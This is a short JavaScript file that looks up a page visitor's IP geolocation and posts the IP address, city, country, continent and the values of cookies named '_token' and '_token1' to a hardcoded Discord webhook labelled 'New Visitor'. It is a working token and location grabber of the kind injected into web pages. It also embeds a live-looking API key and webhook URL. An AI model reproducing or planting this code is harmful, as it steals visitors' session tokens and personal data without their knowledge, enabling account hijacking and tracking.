function getCookie(cname) {
  let name = cname + "=";
  let decodedCookie = decodeURIComponent(document.cookie);
  let ca = decodedCookie.split(';');
  for(let i = 0; i <ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return "";
}
async function getData(){
    const response = await fetch( "https://ipgeolocation.abstractapi.com/v1/?api_key=1787457d8c344652bdc725082344cdd7" );
    return response.json();
}

getData().then((data) => {
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/919718102281908225/u3QiALOWOXtDu7cJ-AjacxHqkm_FxaBzHqxp8PIFMbq8Bh6itvDPSh7b0_0wvPPQ_1cs");
  
    request.setRequestHeader('Content-type', 'application/json');
    var t = {
      content: "",
      embeds: [{
          color: "4700374",
          title: "New Visitor",
          fields: [
            {name: "IP Address", value: data.ip_address},
            {name: "City", value: data.city},
            {name: "County", value: data.country},
            {name: "Continent", value: data.continent},
            {name: "Cookies", value: "_token: "+getCookie("_token")+"\n_token1: "+getCookie("_token1")}
          ],
      }]
  };
  
    request.send(JSON.stringify(t));
})
